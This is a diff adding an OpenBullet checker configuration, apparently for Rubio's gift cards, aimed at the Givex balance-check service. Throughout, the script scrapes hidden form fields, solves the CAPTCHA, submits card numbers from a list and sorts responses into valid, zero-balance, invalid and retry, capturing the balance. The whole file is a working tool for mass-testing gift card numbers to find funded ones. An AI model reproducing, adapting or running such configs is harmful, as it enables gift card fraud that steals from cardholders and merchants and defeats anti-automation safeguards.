@@ -1,0 +1,54 @@
+[SETTINGS]
+{
+  "Name": "Rubios GC",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-19T14:42:46.7694828+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_LOGIN_PAGE REQUEST GET "https://wwws-usa2.givex.com/public/balance/balancecheck.py?18804+_LANGUAGE_:en" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE__LANGUAGE_ PARSE "<SOURCE>" CSS "[name=_LANGUAGE_]" "value" 0 -> VAR "_LANGUAGE_" "" "" 
+#PARSE__FUNCTION_ PARSE "<SOURCE>" CSS "[name=_FUNCTION_]" "value" 0 -> VAR "_FUNCTION_" "" "" 
+#PARSE_WEBINFO_ID PARSE "<SOURCE>" CSS "[name=webinfo_id]" "value" 0 -> VAR "WEBINFO_ID" "" "" 
+#PARSE_MERCHANT_ID PARSE "<SOURCE>" CSS "[name=merchant_id]" "value" 0 -> VAR "MERCHANT_ID" "" "" 
+#PARSE_PARTNER_ID PARSE "<SOURCE>" CSS "[name=partner_id]" "value" 0 -> VAR "PARTNER_ID" "" "" 
+CAPTCHA "https://wwws-usa2.givex.com/public/balance/securebmpr.py?<WEBINFO_ID>" Base64=FALSE SendScreenshot=FALSE -> VAR "captcha" 
+#POST_LOGIN REQUEST POST "https://wwws-usa2.givex.com/public/balance/balancecheck.py?18804+_LANGUAGE_:en" AutoRedirect=TRUE 
+  CONTENT "cardnum=<USER>&_LANGUAGE_=en&_FUNCTION_=result&webinfo_id=<WEBINFO_ID>&merchant_id=18804&partner_id=1&code=<captcha>&x=44&y=7" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://wwws-usa2.givex.com/public/balance/balancecheck.py?18804+_LANGUAGE_:en+merchant_id:18804" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "The balance for card" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "$0.00" 
+  KEYCHAIN Failure OR 
+    KEY "Card number is invalid" 
+  KEYCHAIN Retry OR 
+    KEY "Sorry! The validation" 
+#PARSE_BALANCE PARSE "<SOURCE>" LR "<B>" "</B>" Recursive=FALSE -> CAP "" "" "" 
